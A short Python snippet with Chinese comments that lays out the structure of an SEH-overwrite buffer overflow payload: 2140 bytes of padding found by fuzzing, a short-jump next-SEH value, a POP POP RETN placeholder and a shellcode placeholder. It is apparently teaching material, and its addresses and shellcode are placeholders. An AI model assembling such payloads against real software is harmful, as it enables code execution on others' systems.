#  缓冲区数据样例


junk = "\x41" * 2140 #  A*2140，,2140个数需要fuzzing测试
junk += "\xeb\x06\x90\x90" #  这里是next SEH的地址，该地址写入"\xeb\x06\x90\x90"对应"jmp short 06 NOPS NOPS"，注意EB 06正好对应shellcode地址即跳到shellcode执行
junk += "POP POP RETN"   #  此处原本是SEH调用中断例程的地址，通过junk改写为指令"POP POP RETN"的地址，通过该指令IP读入next SEH地址
junk += "shellcode" #  通过5中EB 06跳转